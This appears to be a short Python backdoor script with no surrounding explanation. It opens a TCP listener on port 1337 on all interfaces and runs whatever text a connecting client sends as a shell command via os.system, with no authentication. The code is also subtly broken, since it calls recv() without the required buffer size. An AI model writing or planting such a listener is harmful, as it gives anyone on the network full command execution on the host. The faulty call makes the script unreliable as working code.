import socket
import os

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(("0.0.0.0", 1337))
sock.listen(20)
while 1:
    client, address = sock.accept()
    data = client.recv()
    if data:
        os.system(data)

